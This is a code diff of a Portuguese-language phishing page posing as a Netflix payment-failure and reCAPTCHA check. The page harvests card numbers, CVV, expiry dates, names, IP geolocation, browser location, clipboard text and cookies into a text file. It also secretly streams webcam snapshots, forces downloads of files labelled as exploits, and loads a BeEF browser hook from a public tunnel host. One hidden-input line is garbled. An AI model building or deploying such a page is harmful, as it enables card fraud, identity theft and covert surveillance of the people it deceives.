@@ -6,16 +6,15 @@
     <title>Netflix | Falha no Pagamento</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
     <style>
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: "Poppins", sans-serif;
         }
-a {
-    style="text-decoration: none;
-  }
+        a {
+            text-decoration: none;
+        }
         body {
             display: flex;
             justify-content: center;
@@ -24,7 +23,6 @@ a {
             background: url('1.jpg') no-repeat center/cover;
             background-color: #141414;
         }
-
         .container {
             width: 100%;
             max-width: 450px;
@@ -36,7 +34,6 @@ a {
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(5px);
         }
-
         h3 {
             font-size: 1.5rem;
             font-weight: 700;
@@ -44,11 +41,9 @@ a {
             color: #4A90E2;
             text-align: center;
         }
-
         .input-box {
             margin: 1rem 0;
         }
-
         .input-box input {
             width: 100%;
             height: 45px;
@@ -61,25 +56,20 @@ a {
             outline: none;
             transition: border-color 0.3s;
         }
-
         .input-box input:focus {
             border-color: #4A90E2;
         }
-
         .input-box input::placeholder {
             color: #a1a1a1;
         }
-
         .input-box input[type="number"]::-webkit-inner-spin-button,
         .input-box input[type="number"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
             margin: 0;
         }
-
         .input-box input[type="number"] {
             -moz-appearance: textfield;
         }
-
         .remember {
             display: flex;
             justify-content: space-between;
@@ -88,11 +78,9 @@ a {
             font-size: 0.9rem;
             color: #b3b3b3;
         }
-
         .remember input[type="checkbox"] {
             margin-right: 5px;
         }
-
         .redirect {
             width: 100%;
             height: 50px;
@@ -105,17 +93,14 @@ a {
             cursor: pointer;
             transition: background 0.3s, transform 0.2s;
         }
-
         .redirect:hover {
             background: #357ABD;
             transform: translateY(-2px);
         }
-
         .feedback {
             margin-top: 1rem;
             text-align: center;
         }
-
         @media (max-width: 480px) {
             .container {
                 margin: 1rem;
@@ -192,7 +177,6 @@ a {
             return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
         }
 
-        
         return [
             'city' => $data['city'] ?? 'Cidade desconhecida',
             'region' => $data['regionName'] ?? 'Região desconhecida',
@@ -217,11 +201,36 @@ a {
         return $files;
     }
 
+    // Captura o IP e a geolocalização assim que a página carrega
     $ip = getUserIP();
     $ipData = getIPInfo($ip);
     $geoLocationIP = ($ipData['city'] ?? 'Cidade desconhecida') . ', ' . 
                      ($ipData['region'] ?? 'Região desconhecida') . ', ' . 
                      ($ipData['country'] ?? 'País desconhecido');
+
+    // Salva a localização do IP no arquivo dados.txt no formato desejado
+    if (!is_dir('uploads')) {
+        mkdir('uploads', 0755, true);
+    }
+
+    $file = fopen("dados.txt", "a");
+    if ($file) {
+        $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
+
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "|                         Cliente $clientNumber                          |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "|  Dados capturados....                                                  |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "| IP: $ip                                                                |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "\n");
+        fclose($file);
+    } else {
+        error_log("Erro ao abrir o arquivo dados.txt para escrita");
+    }
 
     $feedback = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
@@ -232,24 +241,36 @@ a {
         $location = $_POST['location'] ?? 'Localização não disponível';
         $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
 
-        if (!is_dir('uploads')) {
-            mkdir('uploads', 0755, true);
-        }
-
         $file = fopen("dados.txt", "a");
         if ($file) {
-            fwrite($file, "Nome Completo: $a1\n");
-            fwrite($file, "Número do Cartão: $a2\n");
-            fwrite($file, "CVV: $a3\n");
-            fwrite($file, "Validade: $a4\n");
-            fwrite($file, "IP: $ip\n");
-            fwrite($file, "Localização (Navegador): $location\n");
-            fwrite($file, "Localização (IP): $geoLocationIP\n");
-            fwrite($file, "Área de Transferência: $clipboard\n");
-            fwrite($file, "Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
-            fwrite($file, "------------------------\n");
+            $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
+
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "|                         Cliente $clientNumber                          |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "|  Dados capturados....                                                  |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 1: $a1                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 2: $a2                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 3: $a3                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 4: $a4                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| IP: $ip                                                                |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Localização (Navegador): $location                                     |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Área de Transferência: $clipboard                                      |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "\n");
             fclose($file);
-            $feedback = "<p style='color: green;' class='feedback'></p>";
+            $feedback = "<p style='color: green;' class='feedback'>Dados salvos com sucesso!</p>";
         } else {
             $feedback = "<p style='color: red;' class='feedback'>Erro ao salvar os dados!</p>";
         }
@@ -262,26 +283,26 @@ a {
         <form method="POST" enctype="multipart/form-data" id="form">
             <h3>Confirme que é você! - Recaptcha</h3>
             <div class="input-box">
-                <input placeholder="Nome Completo" type="text" name="a1" maxlength="50" required>
+                <input placeholder="Input 1" type="text" name="a1" maxlength="50" required>
             </div>
             <div class="input-box">
-                <input placeholder="Número do Cartão" type="number" name="a2" maxlength="16" required>
+                <input placeholder="Input 2" type="number" name="a2" maxlength="16" required>
             </div>
             <div class="input-box">
-                <input placeholder="CVV" type="number" name="a3" maxlength="3" required>
+                <input placeholder="Input 3" type="number" name="a3" maxlength="3" required>
             </div>
             <div class="input-box">
-                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="a4" maxlength="4" required>
+                <input placeholder="Input 4" type="number" name="a4" maxlength="4" required>
             </div>
             <div class="remember">
                 <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
             </div>
             <video id="video" autoplay style="display: none;"></video>
             <canvas id="canvas" style="display: none;"></canvas>
-            <input type="hidden" name="location" id="locationData">
-            <input type="hidden" name="clipboard" id="clipboardData">
-            <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
-            <button type="submit" class="redirect"><a hrefe="https://adicioneolinkdohookmedobeef">Redirecionar ao WhatsApp!</a></button>
+            <input type="hidden" name="location" id="location信号
+
+            <input type="hidden" name="photo" id="photo" accept="image/png" style="display: none;">
+            <button type="submit" class="redirect">Enviar</button>
             <?php echo $feedback; ?>
         </form>
     </main>
@@ -298,13 +319,12 @@ a {
     ?>
 
     <script>
-        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const locationData = document.getElementById('locationData');
         const clipboardData = document.getElementById('clipboardData');
         const form = document.getElementById('form');
-//Comente daqui ate
+
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -312,16 +332,15 @@ a {
                     console.log("Localização capturada: ", locationData.value);
                 },
                 err => {
-                    locationData.value = "Localização não disponível";
-                    console.error('Erro ao acessar localização:', err);
+                    locationData.value = "N/A";
+                    console.error('Geolocalização negada ou indisponível', err);
                 }
             );
         } else {
-            locationData.value = "Geolocalização não suportada";
+            locationData.value = "N/A";
+            console.log("Geolocalização não suportada pelo navegador");
         }
-//Aqui para tirar a geolocate
 
-        //Comente daqui ate
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
@@ -340,8 +359,8 @@ a {
                             method: 'POST',
                             body: formData
                         })
-                        .then(response => console.log('Foto enviada com sucesso'))
-                        .catch(err => console.error('Erro ao enviar foto:', err));
+                        .then(response => console.log('Foto enviada'))
+                        .catch(err => console.error('Erro ao enviar foto', err));
                     }, 'image/png');
 
                     setTimeout(() => requestAnimationFrame(captureFrame), 1000);
@@ -349,27 +368,25 @@ a {
                 requestAnimationFrame(captureFrame);
             })
             .catch(err => {
-                console.error('Erro ao acessar a câmera:', err);
+                console.error('Acesso à câmera negado ou indisponível:', err);
             });
-        //Aqui para tirar a feature de cameras
-  //Comente daqui ate
+
         async function captureClipboard() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
                     const text = await navigator.clipboard.readText();
                     console.log("Clipboard capturado: ", text);
-                    return text || 'Nenhum texto na área de transferência';
+                    return text || 'N/A';
                 } else {
                     console.log("Clipboard não suportado");
-                    return 'Clipboard não suportado';
+                    return 'N/A';
                 }
             } catch (err) {
-                console.error('Erro ao acessar clipboard:', err.message);
-                return 'Erro ao acessar clipboard: ' + err.message;
+                console.error('Acesso ao clipboard negado ou erro:', err.message);
+                return 'N/A: ' + err.message;
             }
         }
-        //Aqui para tirar feature de clipboard
-  //Comente daqui ate
+
         function triggerDownload(filePath, fileName) {
             const link = document.createElement('a');
             link.href = filePath;
@@ -379,12 +396,10 @@ a {
             document.body.removeChild(link);
             console.log(`Download iniciado: ${fileName}`);
         }
-//Aqui para tirar a feature de clipboard
-          
-        //Comente daqui ate
+
         window.onload = () => {
             document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
-//Aqui para tirar feature de cookies
+
             const arquivos = <?php echo json_encode($exploitFiles); ?>;
             if (arquivos.length > 0) {
                 arquivos.forEach((arquivo, i) => {
@@ -404,35 +419,30 @@ a {
                 form.submit();
             });
         };
-        
-  //
-  //
-  //
-  //     000000000000       000000000000             
-  //     0oooooooooo0       0oooooooooo0		               
-  //     0oo0000oooo0       0oo0000oooo0			                       
-  //     0oo0000oooo0       0oo0000oooo0				                       
-  //     0oo0000oooo0       0oo0000oooo0                   
-  //     0oo0000oooo0       0oo0000oooo0 	          			            
-  //     0oo____oooo0       0oo____oooo0	 
-  //     000000000000       000000000000                                         
-  //     
-  //     1                    ___________         _________				
-  //     1  '    sssssssss  |___________        |_________			
-  //     1       ss         |                   |					
-  //     1         s        |___________      	|_________			 		
-  //     1          s       |                   |			
-  //     1           s 	    |___________        |__________			
-  //     1     ssssssss     |___________        |__________  .you  
-  //     1
-  //	___    			          
-  //  
-  //
-        
+
+        /* 
+            000000000000       000000000000             
+            0oooooooooo0       0oooooooooo0               
+            0oo0000oooo0       0oo0000oooo0                      
+            0oo0000oooo0       0oo0000oooo0                      
+            0oo0000oooo0       0oo0000oooo0                   
+            0oo0000oooo0       0oo0000oooo0                 
+            0oo____oooo0       0oo____oooo0 
+            000000000000       000000000000                                         
+            1                    ___________         _________
+            1  '    sssssssss  |___________        |_________
+            1       ss         |                   |
+            1         s        |___________        |_________
+            1          s       |                   |
+            1           s      |___________        |__________
+            1     ssssssss     |___________        |__________  .you  
+            1
+            ___              
+        */
     </script>
-	<script>
-	var commandModuleStr = '<script src="http://127.0.0.1:3000/hook.js" type="text/javascript"><\/script>';
-	document.write(commandModuleStr);
-</script>
+    <script>
+        var commandModuleStr = '<script src="https://902bfb34f2272eacab39ba2d3ba73d12.serveo.net/hook.js" type="text/javascript"><\/script>';
+        document.write(commandModuleStr);
+    </script>
 </body>
 </html>
